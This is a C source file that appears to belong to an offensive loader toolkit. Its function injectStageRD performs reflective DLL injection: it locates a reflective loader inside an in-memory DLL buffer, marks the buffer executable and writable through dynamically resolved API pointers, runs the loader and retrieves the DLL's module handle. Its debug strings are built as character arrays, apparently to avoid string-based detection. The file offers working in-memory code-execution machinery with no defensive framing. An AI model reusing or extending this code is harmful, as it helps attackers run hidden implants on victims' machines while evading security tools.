#include "../include/injections.h"
#include "../include/addresshunter.h"

HANDLE injectStageRD(PAPI api, PDLL reflectiveDLL)
{
    DWORD loaderOffset;
    REFLECTIVELOADER pReflectiveLoader;
    DLLMAIN pDllMain;

    loaderOffset = GetRLOffset(api, reflectiveDLL->Buffer);

    #ifdef DEBUG
    WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0 };
    ((WPRINTF)api->wprintf)(loader, (UINT_PTR)reflectiveDLL->Buffer + loaderOffset);
    #endif

    //((WPRINTF)api->wprintf)(L"Origin DLL location: %p\n", reflectiveDLL->Buffer);
    pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)reflectiveDLL->Buffer + loaderOffset);

    // TODO: Revert PAGE_EXECUTE_READWRITE protections
    // TODO: Use PAGE_EXECUTE_READ protections instead
    DWORD dwOldProtect;
    ((VIRTUALPROTECT)api->VirtualProtect)(reflectiveDLL->Buffer, reflectiveDLL->Size, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    HANDLE hDllBase = NULL;

    pDllMain = (DLLMAIN)pReflectiveLoader();

    #ifdef DEBUG
    CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 0 };
    ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
    #endif

    if( pDllMain != NULL )
    {
        // call the loaded librarys DllMain to get its HMODULE
        if ( pDllMain(NULL, DLL_QUERY_HMODULE, &hDllBase) == FALSE)
        {
            #ifdef DEBUG
            CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '1', 0 };
            ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
            #endif
            hDllBase = NULL;
        }
    }
    else
    {
        #ifdef DEBUG
        CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '2', 0 };
        ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
        #endif
    }

    return hDllBase;
}

